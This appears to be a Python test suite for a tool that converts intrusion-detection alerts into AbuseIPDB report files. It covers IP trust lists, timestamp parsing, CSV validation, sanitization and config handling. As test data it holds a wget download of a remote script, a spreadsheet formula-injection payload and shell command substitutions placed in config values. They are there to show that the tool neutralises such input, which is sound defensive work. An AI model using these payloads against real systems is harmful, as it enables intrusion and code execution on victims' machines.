            "2026-09-13T16:03:28+0200 host sshd[1]: Accepted keyboard-interactive/bsdauth for bob from 8.8.1.1 port 5 ssh2",
            "2026-09-13T16:03:28+0200 host sshd[2]: Accepted hostbased for bob from 8.8.1.2 port 5 ssh2: ED25519 SHA256:x",
            "2026-09-13T16:03:28+0200 host sshd[3]: Accepted gssapi-with-mic for bob from 8.8.1.3 port 5 ssh2",
            "2026-09-13T16:03:28+0200 host sshd-session[4]: Accepted publickey for bob from 8.8.1.4 port 5 ssh2",
            "2026-09-13T16:03:28+0200 host sshd[5]: Accepted none for bob from 6.6.6.6 port 5 ssh2",
        ])
        self.assertEqual(sorted(m.parse_ssh_accepted(lines, NOW)), ["8.8.1.1", "8.8.1.2", "8.8.1.3", "8.8.1.4"])

    def test_trusted_ip_never_reported(self):
        import ipaddress
        a = alert("5.6.7.8", "http-probing", NOW - timedelta(hours=1), events=http_events(3))
        self.assertEqual(rows_for([a], [ipaddress.ip_network("5.6.7.8")]), [])


def good_row(**over):
    row = {"IP": "8.8.4.4", "Categories": "15,21",
           "ReportDate": (NOW - timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S+00:00"),
           "Comment": "Detected by CrowdSec IDS on a self-hosted server. Target: SSH. Triggered rules: ssh-bf."}
    row.update(over)
    return row


def to_text(rows, header=("IP", "Categories", "ReportDate", "Comment")):
    buf = io.StringIO(newline="")
    w = csv.writer(buf)
    w.writerow(header)
    for r in rows:
        w.writerow([r[h] for h in header] if isinstance(r, dict) else r)
    return buf.getvalue()


class SshTrustIpv6(unittest.TestCase):
    """An IPv6 login trusts its /64 (configurable), so the operator's rotating temporary addresses
    cannot get the operator reported; IPv4 stays exact."""

    LOGIN = "2001:4860:4860::8888"           # a global address, so the IP filter reaches the trust list

    def reportable(self, ip, nets):
        return m.is_reportable_ip(ip, nets)[0]

    def test_neighbour_in_the_same_64_is_trusted_and_another_64_is_not(self):
        nets = m.trusted_networks([self.LOGIN])
        self.assertEqual([str(n) for n in nets], ["2001:4860:4860::/64"])
        self.assertFalse(self.reportable("2001:4860:4860::1234", nets))          # same /64
        self.assertFalse(self.reportable("2001:4860:4860:0:aaaa:bbbb:cccc:dddd", nets))
        self.assertTrue(self.reportable("2001:4860:4861::8888", nets))           # next /64
        self.assertTrue(self.reportable("2001:4860:4860:1::8888", nets))         # other /64, same /48

    def test_prefix_128_restores_the_exact_address(self):
        nets = m.trusted_networks([self.LOGIN], 128)
        self.assertEqual([str(n) for n in nets], [self.LOGIN + "/128"])
        self.assertFalse(self.reportable(self.LOGIN, nets))
        self.assertTrue(self.reportable("2001:4860:4860::1234", nets))

    def test_a_wider_prefix_is_applied_when_configured_inside_the_allowed_range(self):
        nets = m.trusted_networks([self.LOGIN], 96)
        self.assertEqual([str(n) for n in nets], ["2001:4860:4860::/96"])

    def test_ipv4_is_always_exact(self):
        for prefix in (64, 128):
            nets = m.trusted_networks(["8.8.8.8"], prefix)
            self.assertEqual([str(n) for n in nets], ["8.8.8.8/32"])
            self.assertFalse(self.reportable("8.8.8.8", nets))
            self.assertTrue(self.reportable("8.8.4.4", nets))

    def test_addresses_of_one_network_collapse_to_one_entry(self):
        nets = m.trusted_networks([self.LOGIN, "2001:4860:4860::1", "8.8.8.8"])
        self.assertEqual([str(n) for n in nets], ["8.8.8.8/32", "2001:4860:4860::/64"])

    def test_scope_id_in_a_log_line_does_not_break_the_widening(self):
        nets = m.trusted_networks(["fe80::1%eth0"])
        self.assertEqual([str(n) for n in nets], ["fe80::/64"])

    def test_prefix_key_is_validated(self):
        self.assertEqual(m.config_ssh_trust_prefix({}), 64)
        self.assertEqual(m.config_ssh_trust_prefix({"SSH_TRUST_IPV6_PREFIX": ["64", "128"]}), 128)   # last wins
        self.assertEqual(m.config_ssh_trust_prefix({"SSH_TRUST_IPV6_PREFIX": ["64"]}), 64)
        for bad in ("63", "48", "0", "129", "", "64 ", "6 4", "abc", "-64", "64.0", "0064x", "1000"):
            with self.assertRaises(m.ConfigError, msg=bad):
                m.config_ssh_trust_prefix({"SSH_TRUST_IPV6_PREFIX": [bad]})

    def test_unknown_spelling_of_the_key_is_still_a_config_error(self):
        with tempfile.TemporaryDirectory() as d:
            conf = os.path.join(d, "c.conf")
            _write(conf, "OWN_NAME_MARKERS=example.org\nSSH_TRUST_IPV6_PREFIX=64\n")
            self.assertEqual(m.load_config(conf)["SSH_TRUST_IPV6_PREFIX"], ["64"])
            _write(conf, "OWN_NAME_MARKERS=example.org\nSSH_TRUST_IPV6_PREFIXX=64\n")
            with self.assertRaises(m.ConfigError):
                m.load_config(conf)

    def test_ipv4_mapped_login_is_trusted_as_the_plain_ipv4(self):
        # Without unmapping, "::ffff:8.8.8.8" was stored as an IPv6 address, which never matched the
        # (already unmapped) alert address, so the login protected nothing; as a /64 it would be ::/64.
        line = ("2026-09-14T10:00:00+0200 host sshd[1]: Accepted publickey for alice from ::ffff:8.8.8.8 "
                "port 9 ssh2: ED25519 SHA256:abc")
        self.assertEqual(list(m.parse_ssh_accepted(line, NOW)), ["8.8.8.8"])
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "trust.txt")
            _write(p, "::ffff:8.8.4.4\t" + NOW.isoformat() + "\n")
            self.assertEqual(list(m.load_trust_store(p, NOW)), ["8.8.4.4"])

    def test_harvest_widens_journal_logins_and_reports_the_counts(self):
        class R:  # stand-in for CompletedProcess
            stdout = ("2026-09-14T10:00:00+0200 host sshd[1]: Accepted publickey for alice from "
                      "2001:4860:4860::8888 port 9 ssh2: ED25519 SHA256:abc\n"
                      "2026-09-14T11:00:00+0200 host sshd[1]: Accepted publickey for alice from "
                      "2001:4860:4860::1234 port 9 ssh2: ED25519 SHA256:abc")
            stderr, returncode = "", 0
        with mock.patch.object(m.subprocess, "run", return_value=R()), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            nets = m.harvest_ssh_trusted(store_path=None, persist=False)
            exact = m.harvest_ssh_trusted(store_path=None, persist=False, ipv6_prefix=128)
        self.assertEqual([str(n) for n in nets], ["2001:4860:4860::/64"])
        self.assertEqual(len(exact), 2)
        self.assertIn("2 addresses with a successful login", err.getvalue())
        self.assertIn("1 networks will never be reported (IPv6 trusted as /64)", err.getvalue())

    def test_the_remembered_list_keeps_single_addresses_and_widens_on_read(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "trust.txt")
            m.save_trust_store(p, {self.LOGIN: NOW - timedelta(days=3)})
            with mock.patch.object(m.subprocess, "run", side_effect=OSError("no journal")), \
                    contextlib.redirect_stderr(io.StringIO()):
                nets = m.harvest_ssh_trusted(store_path=p, persist=True)
            self.assertEqual([str(n) for n in nets], ["2001:4860:4860::/64"])
            self.assertIn(self.LOGIN, _read(p))
            self.assertNotIn("/64", _read(p))


class IsoParsing(unittest.TestCase):
    """Timestamps must parse the same on Python 3.9/3.10 (strict fromisoformat)
    and on 3.11+. normalize_iso() is tested as TEXT so a broken rewrite is caught
    on every Python version, not only on the old ones."""

    def test_offset_without_colon_gets_a_colon(self):
        self.assertEqual(m.normalize_iso("2026-09-13T16:03:28+0200"), "2026-09-13T16:03:28+02:00")
        self.assertEqual(m.normalize_iso("2026-09-13T16:03:28-0530"), "2026-09-13T16:03:28-05:30")

    def test_valid_text_is_left_alone(self):
        for ok in ("2026-09-13T16:03:28+02:00", "2026-09-13T16:03:28.123456+00:00",
                   "2026-09-13T16:03:28", "2026-09-13", "2026-09-13 16:03:28+00:00"):
            self.assertEqual(m.normalize_iso(ok), ok)

    def test_z_suffix_becomes_utc_offset(self):
        self.assertEqual(m.normalize_iso("2026-08-27T07:06:43Z"), "2026-08-27T07:06:43+00:00")

    def test_fraction_is_forced_to_six_digits(self):
        for frac, want in (("1", "100000"), ("12345", "123450"), ("123", "123000"),
                           ("123456", "123456"), ("123456789", "123456")):
            self.assertEqual(m.normalize_iso(f"2026-08-27T07:06:43.{frac}Z"),
                             f"2026-08-27T07:06:43.{want}+00:00", frac)

    def test_parse_iso_datetime_values(self):
        d = m.parse_iso_datetime("2026-08-27T07:06:43.123456789Z")
        self.assertEqual((d.microsecond, d.utcoffset()), (123456, timedelta(0)))
        self.assertEqual(m.parse_iso_datetime("2026-09-13T16:03:28+0200").utcoffset(), timedelta(hours=2))
        self.assertIsNone(m.parse_iso_datetime("2026-09-13T16:03:28").tzinfo)      # naive stays naive

    def test_garbage_still_raises(self):
        for bad in ("", "garbage", "2026-13-45T00:00:00Z", "yesterday+0200"):
            with self.assertRaises(ValueError, msg=bad):
                m.parse_iso_datetime(bad)

    def test_parse_ts_tolerates_odd_values(self):
        self.assertEqual(m.parse_ts("2026-08-27T07:06:43.123456789Z").microsecond, 123456)
        for unusable in (None, "", 12345, ["2026-08-27T07:06:43Z"], "not a date"):
            self.assertIsNone(m.parse_ts(unusable), repr(unusable))
        self.assertEqual(m.parse_ts("2026-08-27T07:06:43").tzinfo, timezone.utc)   # naive = UTC


class Validator(unittest.TestCase):
    def errs(self, rows, **kw):
        e, w, n = m.validate_csv_text(to_text(rows, **kw))
        return e

    def has(self, errors, needle):
        self.assertTrue(any(needle in e for e in errors), f"{needle!r} not in {errors}")

    def test_backslash_before_a_quote_or_at_the_end_is_rejected(self):
        for bad in ('Detected. Sample requests: GET /a\\"b', "Detected. Sample requests: GET /a\\"):
            self.has(self.errs([good_row(Comment=bad)]), "backslash before a quote or at the end")
        self.assertEqual(self.errs([good_row(Comment="Detected. GET /\\x5Cthink -> 404")]), [])

    def test_good_file_passes(self):
        e, w, n = m.validate_csv_text(to_text([good_row(), good_row(IP="1.1.1.1")]))
        self.assertEqual((e, n), ([], 2))

    def test_header_any_order_ok_but_missing_fails(self):
        order = ("Comment", "IP", "ReportDate", "Categories")
        self.assertEqual(self.errs([good_row()], header=order), [])
        self.has(self.errs([["8.8.8.8", "15", "x"]], header=("IP", "Categories", "ReportDate")), "headers")

    def test_duplicate_and_private_ip(self):
        self.has(self.errs([good_row(), good_row()]), "duplicate IP")
        self.has(self.errs([good_row(IP="10.0.0.1")]), "IP")
        self.has(self.errs([good_row(IP="100.64.0.1")]), "IP")
        self.has(self.errs([good_row(IP="999.1.1.1")]), "IP")

    def test_categories(self):
        for bad in ("", "0", "24", "abc", "15,,21", "15;21"):
            self.has(self.errs([good_row(Categories=bad)]), "categories")

    def test_dates(self):
        self.has(self.errs([good_row(ReportDate="2026-09-28T10:00:00")]), "no timezone")
        self.has(self.errs([good_row(ReportDate=(NOW - timedelta(days=61)).strftime("%Y-%m-%dT%H:%M:%S+00:00"))]), "older than")
        self.has(self.errs([good_row(ReportDate=(NOW + timedelta(hours=2)).strftime("%Y-%m-%dT%H:%M:%S+00:00"))]), "future")
        self.has(self.errs([good_row(ReportDate="yesterday")]), "ISO 8601")

    def test_comment_rules(self):
        self.has(self.errs([good_row(Comment="")]), "empty")
        self.has(self.errs([good_row(Comment="a" * 1025)]), "1024")
        self.assertEqual(self.errs([good_row(Comment="a" * 1024)]), [])
        self.has(self.errs([good_row(Comment="zażółć gęślą")]), "ASCII")
        self.has(self.errs([good_row(Comment="line1\nline2")]), "control characters")
        self.has(self.errs([good_row(Comment="=HYPERLINK(1)")]), "formula")
        self.has(self.errs([good_row(Comment="scan from 8.8.4.4 seen")]), "IP address")

    def test_own_name_markers_reject_comments(self):
        with mock.patch.object(m, "OWN_NAME_MARKERS", ("example.org", "myhost.example")):
            self.has(self.errs([good_row(Comment="host chat.example.org probed")]), "example.org")
            self.has(self.errs([good_row(Comment="host MyHost.Example probed")]), "myhost.example")
            self.assertEqual(self.errs([good_row(Comment="host other.test probed")]), [])

    def test_no_markers_means_the_check_is_inactive(self):
        with mock.patch.object(m, "OWN_NAME_MARKERS", ()):
            self.assertEqual(self.errs([good_row(Comment="host chat.example.org probed")]), [])

    def test_percent_encoded_names_and_ip_are_rejected_by_the_validator(self):
        with mock.patch.object(m, "OWN_NAME_MARKERS", ("example.org",)):
            self.has(self.errs([good_row(Comment="GET /x?h=www%2Eexample%2Eorg -> 404")]), "example.org")
            self.has(self.errs([good_row(Comment="GET /x?h=www%252Eexample%252Eorg -> 404")]), "example.org")
            self.assertEqual(self.errs([good_row(Comment="GET /a%20b?q=%3Cx%3E -> 404")]), [])
        self.has(self.errs([good_row(Comment="GET /c?x=8%2E8%2E4%2E4 -> 404")]), "IP address")
        e, w, _ = m.validate_csv_text(to_text([good_row(Comment="GET /r?u=jane%40mail.example.net -> 404")]))
        self.assertEqual(e, [])
        self.assertTrue(w)                                                    # the e-mail warning sees it too

    def test_other_ip_in_comment_is_allowed(self):
        self.assertEqual(self.errs([good_row(Comment="CONNECT 1.2.3.4:443 -> 400")]), [])

    def test_email_is_warning_only(self):
        e, w, _ = m.validate_csv_text(to_text([good_row(Comment="GET /@user@host.com/x -> 404")]))
        self.assertEqual(e, [])
        self.assertTrue(w)

    def test_limits(self):
        many = [good_row(IP=f"{a}.{b}.1.1") for a in range(20, 60) for b in range(1, 255)][:10000]
        e, _, _ = m.validate_csv_text(to_text(many))
        self.has(e, "limit")                                    # 10,001 lines with the header
        ok = many[:m.MAX_ROWS]
        e, _, n = m.validate_csv_text(to_text(ok))
        self.assertEqual((e, n), ([], m.MAX_ROWS))

    def test_empty_and_no_data(self):
        self.has(m.validate_csv_text("")[0], "empty")
        self.has(m.validate_csv_text("IP,Categories,ReportDate,Comment\r\n")[0], "no data rows")

    def test_wrong_field_count_and_embedded_newline(self):
        self.has(self.errs([["8.8.8.8", "15", "x"]], header=("IP", "Categories", "ReportDate", "Comment")), "fields")
        # a quoted field (comma) with a real newline character inside
        e = self.errs([good_row(Comment="Target: SSH, x\r\ny")])
        self.has(e, "control characters")
        self.has(e, "number of lines")
        # an unquoted newline splits the record - it must be rejected too
        text = to_text([good_row()]).replace("Target: SSH.", "Target:\r\nSSH.")
        self.assertTrue(m.validate_csv_text(text)[0])

    def test_validate_file_unreadable_and_binary(self):
        self.has(m.validate_file("/nonexistent.csv")[0], "cannot read")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"\xff\xfe\x00bad")
        try:
            self.has(m.validate_file(f.name)[0], "cannot read")
        finally:
            os.unlink(f.name)


class Generated(unittest.TestCase):
    """Everything the generator actually produces must pass the validator."""

    def test_hostile_payloads_survive_sanitization(self):
        evil = ["/=cmd|'/c calc'!A1", "/żółć", "/a\r\nb,\"c\"", "/" + "x" * 3000,
                "/@evil@example.com/x", "/+SUM(1)", "/-2+3", "/\t\ttab"]
        evs = [ev("t", p) for p in evil]
        a = alert("8.8.8.8", "http-sensitive-files", NOW - timedelta(minutes=10), events=evs)
        rows = rows_for([a])
        buf = io.StringIO(newline="")
        m.write_csv(buf, rows)
        errors, warnings, n = m.validate_csv_text(buf.getvalue())
        self.assertEqual((errors, n), ([], 1))
        self.assertLessEqual(len(rows[0][3].encode()), 1024)
        self.assertTrue(rows[0][3].isascii())

    def test_sanitize_neutralises_formula_prefixes_and_non_ascii(self):
        for prefix in ("=", "+", "-", "@"):
            self.assertEqual(m.sanitize_comment(prefix + "cmd"), "'" + prefix + "cmd")
        self.assertEqual(m.sanitize_comment("ok"), "ok")
        self.assertEqual(m.sanitize_comment("ażób\r\nc"), "a b c")

    def test_first_run_of_ip_and_ipv6_row(self):
        a = alert("2001:4860:4860::8888", "http-probing", NOW - timedelta(minutes=10), events=http_events(2))
        buf = io.StringIO(newline="")
        m.write_csv(buf, rows_for([a]))
        self.assertEqual(m.validate_csv_text(buf.getvalue())[0], [])


class DecodedViews(unittest.TestCase):
    def test_views(self):
        self.assertEqual(m.decoded_views("plain"), ["plain"])
        self.assertEqual(m.decoded_views("a%2Eb"), ["a%2Eb", "a.b"])
        self.assertEqual(m.decoded_views("a%252Eb"), ["a%252Eb", "a%2Eb", "a.b"])
        self.assertEqual(len(m.decoded_views("a%25252Eb")), 3)                # at most two rounds

    def test_broken_sequences_never_raise(self):
        for text in ("%", "%zz", "100%", "%e9%", "%ff%fe", "%00", ""):
            self.assertIsInstance(m.decoded_views(text), list, text)


class SampleLeaks(unittest.TestCase):
    """A hostile path from the attacker must cost one sample, never the whole file."""

    def setUp(self):
        patcher = mock.patch.object(m, "OWN_NAME_MARKERS", ("example.org", "myhost.example"))
        patcher.start()
        self.addCleanup(patcher.stop)

    def one(self, ip, paths, own=()):
        evs = [ev(f"t{i}", p) for i, p in enumerate(paths)]
        a = alert(ip, "http-sensitive-files", NOW - timedelta(minutes=10), events=evs)
        rows = m.build_rows([a], [], own_addresses=own)
        self.assertEqual([r[0] for r in rows], [ip])                 # the report itself is kept
        buf = io.StringIO(newline="")
        m.write_csv(buf, rows)
        self.assertEqual(m.validate_csv_text(buf.getvalue())[0], [])  # ... and the file stays valid
        return rows[0][3]

    def test_own_name_in_a_path_is_omitted_and_the_rest_kept(self):
        c = self.one("8.8.8.8", ["/a", "/z9x8-debug-trigger-www.EXAMPLE.org", "/b", "/c.myhost.example/x"])
        self.assertIn("Sample requests: GET /a -> 404; GET /b -> 404", c)
        self.assertNotIn("example.org", c.lower())
        self.assertNotIn("myhost.example", c.lower())

    def test_email_in_a_path_is_omitted(self):
        c = self.one("8.8.8.8", ["/ok", "/reset?user=jane.doe@mail.example.net"])
        self.assertIn("Sample requests: GET /ok -> 404", c)
        self.assertNotIn("@", c)

    def test_quote_becomes_percent_22_and_backslashes_stay(self):
        c = self.one("8.8.8.8", ['/index.php?s=\\x5Cthink\\x5Capp&q="x\\"'])
        self.assertIn('/index.php?s=\\x5Cthink\\x5Capp&q=%22x\\%22 -> 404', c)
        self.assertNotIn('"', c)

    def test_comment_never_ends_with_a_backslash(self):
        evs = [ev("t1", "/end\\", status="")]                       # no status: the path ends the comment
        a = alert("8.8.8.8", "http-sensitive-files", NOW - timedelta(minutes=10), events=evs)
        c = m.build_rows([a], [])[0][3]
        self.assertTrue(c.endswith("GET /end%5C"), c)
        self.assertFalse(m.sanitize_comment("abc\\").endswith("\\"))

    def test_reported_ipv4_in_a_path_is_omitted(self):
        c = self.one("8.8.8.8", ["/ok", "/cgi-bin/x?cmd=wget http://8.8.8.8/x.sh"])
        self.assertIn("Sample requests: GET /ok -> 404", c)
        self.assertNotIn("8.8.8.8", c)

    def test_reported_ipv6_in_a_path_is_omitted(self):
        c = self.one("2001:4860:4860::8888", ["/ok", "/x?u=http://[2001:4860:4860::8888]/a"])
        self.assertIn("GET /ok -> 404", c)
        self.assertNotIn("2001:4860", c)

    def test_reported_ipv6_written_differently_in_the_alert_is_still_caught(self):
        # the validator compares the canonical form, so the generator must as well
        evs = [ev("t1", "/ok"), ev("t2", "/x?u=2001:4860:4860::8888")]
        a = alert("2001:4860:4860:0:0:0:0:8888", "http-sensitive-files", NOW - timedelta(minutes=10), events=evs)
        c = m.build_rows([a], [])[0][3]
        self.assertIn("GET /ok -> 404", c)
        self.assertNotIn("2001:4860", c)

    def test_own_server_address_in_a_path_is_omitted(self):
        import ipaddress
        own = [ipaddress.ip_network("9.9.9.9")]
        c = self.one("8.8.8.8", ["/ok", "/x?host=9.9.9.9"], own=own)
        self.assertIn("GET /ok -> 404", c)
        self.assertNotIn("9.9.9.9", c)
        # without the own addresses the sample is (deliberately) not touched: another IP is allowed
        self.assertIn("9.9.9.9", self.one("8.8.8.8", ["/ok", "/x?host=9.9.9.9"]))

    def test_all_samples_hostile_leaves_a_valid_report_without_samples(self):
        c = self.one("8.8.8.8", ["/a.example.org", "/b?ip=8.8.8.8"])
        self.assertNotIn("Sample requests", c)
        self.assertTrue(c.endswith("(UTC)."), c)

    def test_without_markers_only_the_ip_check_remains(self):
        with mock.patch.object(m, "OWN_NAME_MARKERS", ()):
            c = self.one("8.8.8.8", ["/a.example.org", "/b?ip=8.8.8.8"])
        self.assertIn("GET /a.example.org -> 404", c)
        self.assertNotIn("8.8.8.8", c)

    def test_omitted_samples_are_counted_on_stderr_without_the_content(self):
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.one("8.8.8.8", ["/a.example.org", "/b?ip=8.8.8.8", "/fine"])
        self.assertIn("omitted 2 sample requests", err.getvalue())
        self.assertNotIn("example.org", err.getvalue())

    def test_percent_encoded_own_name_is_omitted_too(self):
        # %2E is a dot: a plain substring search for "example.org" does not see it.
        c = self.one("8.8.8.8", ["/ok", "/x?h=www%2Eexample%2Eorg", "/y?h=www%252Emyhost%252Eexample", "/fine"])
        self.assertIn("Sample requests: GET /ok -> 404; GET /fine -> 404", c)
        self.assertNotIn("%2E", c.upper())
        self.assertNotIn("example", c.lower())

    def test_percent_encoded_email_is_omitted(self):
        c = self.one("8.8.8.8", ["/ok", "/reset?user=jane%40mail.example.net"])
        self.assertIn("Sample requests: GET /ok -> 404", c)
        self.assertNotIn("jane", c)

    def test_percent_encoded_reported_ip_is_omitted(self):
        c = self.one("8.8.8.8", ["/ok", "/cgi?cmd=wget%20http://8%2E8%2E8%2E8/x.sh"])
        self.assertIn("Sample requests: GET /ok -> 404", c)
        self.assertNotIn("wget", c)

    def test_ordinary_percent_encoding_is_left_alone(self):
        c = self.one("8.8.8.8", ["/a%20b/c%2Fd?q=%3Cscript%3E"])
        self.assertIn("GET /a%20b/c%2Fd?q=%3Cscript%3E -> 404", c)

    def test_clean_reports_are_unchanged(self):
        c = self.one("8.8.8.8", ["/a", "/b"])
        self.assertTrue(c.endswith("Sample requests: GET /a -> 404; GET /b -> 404"), c)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.one("8.8.8.8", ["/a", "/b"])
        self.assertNotIn("omitted", err.getvalue())


class ConfigFile(unittest.TestCase):
    """The single config file: parsing, markers, exclusions, precedence."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.conf = os.path.join(self.tmp.name, "abuseipdb.conf")

    def write(self, text, mode=0o600):
        _write(self.conf, text)
        os.chmod(self.conf, mode)

    def load(self):
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            cfg = m.load_config(self.conf)
        return cfg, err.getvalue()

    def test_parse_comments_blanks_spaces_and_repeats(self):
        self.write("# comment\n\n  OWN_NAME_MARKERS = a.example , b.example \n#EXCLUDE=1.1.1.1\n"
                   "EXCLUDE=203.0.113.7\nEXCLUDE = 198.51.100.0/24\nNTFY_URL=\n")
        cfg, err = self.load()
        self.assertEqual(cfg, {"OWN_NAME_MARKERS": ["a.example , b.example"],
                               "EXCLUDE": ["203.0.113.7", "198.51.100.0/24"]})   # empty values are dropped
        self.assertEqual(err, "")

    def test_bad_and_unknown_lines_fail_closed(self):
        # A typo must not silently drop an entry: every problem is listed and the run stops.
        self.write("no equals sign\nlower_case=1\nEXLUDE=1\nEXCLUDE=203.0.113.7\n")
        with self.assertRaises(m.ConfigError) as cm:
            self.load()
        msg = str(cm.exception)
        self.assertIn("line 1: not a KEY=value", msg)
        self.assertIn("line 2: not a KEY=value", msg)
        self.assertIn("line 3: unknown key EXLUDE", msg)

    def test_comment_after_a_value_fails_closed(self):
        for line in ("EXCLUDE=203.0.113.7 # home", "OWN_NAME_MARKERS=example.org\t# mine"):
            self.write(line + "\n")
            with self.assertRaises(m.ConfigError, msg=line) as cm:
                self.load()
            self.assertIn("comment after the value", str(cm.exception))
        self.write("NTFY_URL=https://ntfy.example.test/#frag\n")      # '#' without a space is a value
        self.assertEqual(self.load()[0], {"NTFY_URL": ["https://ntfy.example.test/#frag"]})

    def test_missing_file_gives_empty_config_and_info(self):
        cfg, err = self.load()
        self.assertEqual(cfg, {})
        self.assertIn("does not exist", err)
        self.assertEqual(m.load_config(""), {})

    def test_unreadable_file_fails_closed(self):
        # A file that EXISTS but cannot be used must stop the run: carrying on without it would silently
        # drop the own-name check and every EXCLUDE entry.
        self.write("OWN_NAME_MARKERS=example.org\n")
        with mock.patch("builtins.open", side_effect=PermissionError):
            with self.assertRaises(m.ConfigError) as cm:
                m.load_config(self.conf)
        self.assertIn("PermissionError", str(cm.exception))

    def test_config_that_is_not_utf8_fails_closed_in_every_mode(self):
        # A comment typed in a legacy code page (here Latin-1 / Windows-1250 bytes) is enough.
        with open(self.conf, "wb") as f:
            f.write(b"OWN_NAME_MARKERS=example.org\nEXCLUDE=8.8.8.8\n# z\xb3o\xbf\n")
        os.chmod(self.conf, 0o600)
        with self.assertRaises(m.ConfigError) as cm:
            m.load_config(self.conf)
        self.assertIn("UnicodeDecodeError", str(cm.exception))
        csv_path = os.path.join(self.tmp.name, "reports.csv")
        _write(csv_path, to_text([good_row()]), newline="")
        for args in (["--validate", csv_path],
                     ["--input-json", self.alerts_file(), "--no-ssh-trust",
                      "--dry-run"]):
            r = self.run_script("--config", self.conf, *args)
            self.assertEqual(r.returncode, 2, (args, r.stderr))
            self.assertIn("cannot read config file", r.stderr)
            self.assertEqual(r.stdout, "")

    def test_world_readable_config_warns(self):
        self.write("OWN_NAME_MARKERS=example.org\n", mode=0o644)
        cfg, err = self.load()
        self.assertEqual(cfg["OWN_NAME_MARKERS"], ["example.org"])
        self.assertIn("chmod 600", err)
        self.write("OWN_NAME_MARKERS=example.org\n", mode=0o600)
        self.assertNotIn("chmod", self.load()[1])

    def test_config_is_data_not_code(self):
        canary = os.path.join(self.tmp.name, "pwned")
        self.write(f"OWN_NAME_MARKERS=$(touch {canary})\nEXCLUDE=`touch {canary}`\n")
        cfg, _ = self.load()
        self.assertFalse(os.path.exists(canary))
        self.assertEqual(cfg["OWN_NAME_MARKERS"], [f"$(touch {canary})"])
        with self.assertRaises(m.ConfigError):                     # a space inside: not a host name
            m.config_markers(cfg)
        with self.assertRaises(m.ConfigError):                     # not an address either
            m.config_exclusions(cfg, self.conf)
        self.assertFalse(os.path.exists(canary))

    def test_markers_are_lowercased_deduplicated_and_merged(self):
        cfg = {"OWN_NAME_MARKERS": ["Example.ORG, host.example", "example.org,, "]}
        self.assertEqual(m.config_markers(cfg), ("example.org", "host.example"))
        self.assertEqual(m.config_markers({}), ())
        self.assertEqual(m.config_markers({"OWN_NAME_MARKERS": [" , ,"]}), ())

    def test_marker_with_a_space_or_hash_fails_closed(self):
        for bad in ("example.org host.example", "example.org#x"):
            with self.assertRaises(m.ConfigError, msg=bad):
                m.config_markers({"OWN_NAME_MARKERS": [bad]})

    def test_invalid_config_exclusion_fails_closed(self):
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            nets = m.config_exclusions({"EXCLUDE": ["203.0.113.7", "198.51.100.0/24"]}, self.conf)
        self.assertEqual([str(n) for n in nets], ["203.0.113.7/32", "198.51.100.0/24"])
        with self.assertRaises(m.ConfigError) as cm:
            m.config_exclusions({"EXCLUDE": ["203.0.113.7", "not-an-ip"]}, self.conf)
        self.assertIn("invalid EXCLUDE entry", str(cm.exception))

    def run_script(self, *args, **envover):
        env = dict(os.environ, **envover)
        return subprocess.run([sys.executable, str(SCRIPT), *args], capture_output=True, text=True, env=env)

    def alerts_file(self):
        path = os.path.join(self.tmp.name, "alerts.json")
        _dump([alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(4)),
               alert("9.9.9.9", "ssh-bf", NOW - timedelta(hours=2), events=[ev("t", service="ssh")] * 6)], path)
        return path

    def test_exclude_key_removes_only_the_listed_address(self):
        args = ["--config", self.conf, "--input-json", self.alerts_file(), "--no-ssh-trust", "--dry-run"]
        self.write("OWN_NAME_MARKERS=example.org\nEXCLUDE=8.8.8.8\n")
        r = self.run_script(*args)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("exclusion entries from the config file", r.stderr)
        self.assertEqual([x["IP"] for x in csv.DictReader(io.StringIO(r.stdout))], ["9.9.9.9"])
        self.write("OWN_NAME_MARKERS=example.org\nEXCLUDE=203.0.113.7\n")      # unrelated entry: nothing removed
        r = self.run_script(*args)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(sorted(x["IP"] for x in csv.DictReader(io.StringIO(r.stdout))), ["8.8.8.8", "9.9.9.9"])

    def test_old_exclude_file_option_is_gone(self):
        # The separate exclusion file was removed: EXCLUDE in the config file is the only source.
        self.write("OWN_NAME_MARKERS=example.org\n")
        r = self.run_script("--config", self.conf, "--input-json", self.alerts_file(), "--no-ssh-trust",
                            "--exclude-file", os.devnull, "--dry-run")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("unrecognized arguments: --exclude-file", r.stderr)

    def test_config_exclude_alone_is_enough(self):
        self.write("OWN_NAME_MARKERS=example.org\nEXCLUDE=8.8.8.0/24\nEXCLUDE=9.9.9.9\n")
        r = self.run_script("--config", self.conf, "--input-json", self.alerts_file(),
                            "--no-ssh-trust", "--dry-run")
        self.assertEqual(r.returncode, 1, r.stderr)

    def test_validate_uses_markers_from_the_config(self):
        csv_path = os.path.join(self.tmp.name, "reports.csv")
        _write(csv_path, to_text([good_row(Comment="scan of chat.example.org seen")]), newline="")
        self.write("OWN_NAME_MARKERS=example.org\n")
        r = self.run_script("--config", self.conf, "--validate", csv_path)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("our own name (example.org)", r.stderr)
        self.write("OWN_NAME_MARKERS=other.test\n")
        self.assertEqual(self.run_script("--config", self.conf, "--validate", csv_path).returncode, 0)

    def test_empty_markers_warn_but_do_not_fail(self):
        csv_path = os.path.join(self.tmp.name, "reports.csv")
        _write(csv_path, to_text([good_row()]), newline="")
        for text in (None, "# nothing here\n", "OWN_NAME_MARKERS=\n"):
            if text is not None:
                self.write(text)
            r = self.run_script("--config", self.conf, "--validate", csv_path)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("OWN_NAME_MARKERS is empty", r.stderr)

    def test_bad_config_stops_every_mode_with_exit_2(self):
        csv_path = os.path.join(self.tmp.name, "reports.csv")
        _write(csv_path, to_text([good_row()]), newline="")
